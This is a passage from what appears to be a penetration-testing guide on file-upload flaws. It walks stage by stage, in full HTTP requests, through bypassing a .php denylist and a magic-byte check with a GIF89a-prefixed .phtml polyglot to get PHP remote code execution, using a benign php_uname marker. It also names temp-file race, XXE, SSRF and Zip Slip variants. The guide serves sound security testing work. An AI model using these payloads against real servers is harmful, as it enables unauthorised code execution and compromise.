@@ -499,6 +499,97 @@ A common "safe" pattern is **save → then validate/AV-scan/re-encode/rename/del
 Variants: "upload → quarantine/move" (hit it before the move), "upload → process → remove temp" (hit the temp path), and the PHP **`LFI + phpinfo()` temp-file race** (leak the random `/tmp/phpXXXXXX` name from a phpinfo page, then `include` it before PHP deletes it — cross-ref the LFI kit).
 > **If this → then that:** the server returns "file type not allowed" *after* a delay (it saved first, then validated/deleted) → there's a **race window**. Fire many parallel GETs to the stored URL during upload; catching one execution = RCE. Randomized filenames make this harder — but the response, a predictable temp path, or an LFI to include the temp upload can still win.
 
+## 12.4 The full attack, end-to-end — a wire-level transcript (baseline → classify → bypass → RCE)
+
+> *In plain words:* every payload table above is a piece; this is the **whole board played out on the wire** against one realistic target — an Apache + mod_php app whose avatar upload has a `.php` **denylist** *and* a **libmagic** image check (Model C from §6.1). You'll see exactly what each request looks like and — crucially — **what the response tells you to do next.** Read it once and the "if X → do Y" logic becomes muscle memory. Every value here is a **benign marker**; the moment RCE is proven, we stop.
+
+**Stage 0 — Baseline (§4): follow one honest file and read the three answers off the wire.**
+```http
+POST /account/avatar HTTP/1.1
+Host: shop.target.com
+Content-Type: multipart/form-data; boundary=X
+Cookie: session=<our own account A>
+
+--X
+Content-Disposition: form-data; name="avatar"; filename="me.png"
+Content-Type: image/png
+
+\x89PNG\r\n\x1a\n...<a real, small, valid PNG>...
+--X--
+```
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"ok":true,"url":"/uploads/u/A17f/me.png"}          ← (1) WHERE: same-origin web path, user-scoped dir
+```
+Now fetch it back to answer questions **(2)** and **(3)**:
+```http
+GET /uploads/u/A17f/me.png HTTP/1.1
+Host: shop.target.com
+--------------------------------------------------
+HTTP/1.1 200 OK
+Content-Type: image/png                              ← (2) served from the APP ORIGIN, inline
+Server: Apache/2.4.53 (Ubuntu)                       ← (3) Apache + (X-Powered-By below) mod_php
+X-Powered-By: PHP/7.4.33
+```
+> **Baseline verdict (the severity ceiling, decided here — not by the payload):** stored **in the web root, on the app origin, an Apache/mod_php host, no `nosniff`, no CDN sandbox.** All four RCE preconditions from §12.1 are *reachable*. RCE is on the table — so we invest here. (Had this returned `usercontent-cdn.net`, `Content-Disposition: attachment`, `nosniff`, and a re-encoded random name, we'd pivot to a parser/URL-fetch feature per §4.3 instead.)
+
+**Stage 1 — Classify the validator with the 4-way probe (§6.1). Send the *same intent* four ways and read the rejections:**
+```
+① me.php        + Content-Type: image/png  + PNG bytes   → 403 "file type not allowed"   (name blocked)
+② me.png        + Content-Type: text/plain + PNG bytes   → 200 accepted                   (CT header NOT trusted → not Model A)
+③ me.phtml      + Content-Type: image/png  + text bytes  → 403 "invalid image"            (bytes checked → Model C/D)
+④ me.phtml      + Content-Type: image/png  + GIF89a;text → 200 accepted                   (magic prefix satisfied the check)
+```
+> **Classification:** probe ② proves the **CT header is ignored** (not Model A). Probe ③ (text body rejected as "invalid image") vs probe ④ (a bare `GIF89a;` prefix *accepted*) proves a **libmagic signature check, Model C — not a full decode (Model D)**. And critically, probe ④'s filename `me.phtml` was **accepted** — the denylist blocks `.php` but *forgot `.phtml`* (§7.1), and Apache/mod_php still executes `.phtml`. We now have both halves: a **name that executes** and a **magic prefix that passes**. Combine them.
+
+**Stage 2 — The winning upload: a `GIF89a`-prefixed `.phtml` carrying a benign RCE marker.**
+```http
+POST /account/avatar HTTP/1.1
+Host: shop.target.com
+Content-Type: multipart/form-data; boundary=X
+Cookie: session=<account A>
+
+--X
+Content-Disposition: form-data; name="avatar"; filename="me.phtml"
+Content-Type: image/png
+                                     ← magic prefix (passes Model C) ↓, then code the mod_php engine still scans
+GIF89a;
+<?php echo "RCE-POC-".md5("x8bitranjit-fileupload-2026")."-".php_uname(); ?>
+--X--
+--------------------------------------------------
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"ok":true,"url":"/uploads/u/A17f/me.phtml"}         ← survived BOTH controls, landed in the executable web root
+```
+
+**Stage 3 — Trigger: request the stored file. The handler runs it.**
+```http
+GET /uploads/u/A17f/me.phtml HTTP/1.1
+Host: shop.target.com
+--------------------------------------------------
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+GIF89a;
+RCE-POC-4b1f...c9-Linux shop-web-7 5.15.0-1041-aws x86_64
+```
+> The response body contains our **unique marker + the kernel/hostname string** that only `php_uname()` on the server can produce. That single line **proves remote code execution**: the four links of §12.1 all lined up (survived controls → landed in an executed dir → matching handler → we could request it). The `GIF89a;` echoed above the marker is the harmless magic prefix — proof the *same bytes* were a "valid image" to the validator and live PHP to the engine (a Model-C polyglot).
+
+**Stage 4 — STOP. Package it (§26).** We do **not** upgrade the marker to an interactive shell or run a second command. The marker line *is* the complete Critical. Delete `me.phtml`, note the deletion, and write it up as **CWE-434, CVSS `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = 9.9 Critical** with the four requests above as the reproduction.
+
+**What each stage proved (the transferable arc):**
+```
+Stage 0  baseline      → severity CEILING (web root + app origin + mod_php + no nosniff = RCE reachable)
+Stage 1  4-way probe   → the exact control model (Model C libmagic) AND the denylist gap (.phtml) — no blind fuzzing
+Stage 2  GIF89a+.phtml → one file that satisfies BOTH the magic check and the executing handler (a polyglot)
+Stage 3  GET the URL   → execution CONFIRMED with a benign marker only the server could generate
+Stage 4  stop + report → Critical proven; no weaponization, artifact deleted
+```
+This is the skeleton every high-value upload finding hangs on. The *same five stages* re-skin for every other cash-out: swap Stage 2's polyglot for a **parsed SVG → XXE** (§14), an **import-from-URL → SSRF→metadata** (§15), a **crafted PNG → ImageMagick CVE-2022-44268 file-read** (§16), or a **`../` zip entry → Zip Slip → web-root shell** (§17) — Stages 0/1/4 (baseline, classify, safe-stop) never change.
+
 ---
 
 # 13. Stored XSS via Upload
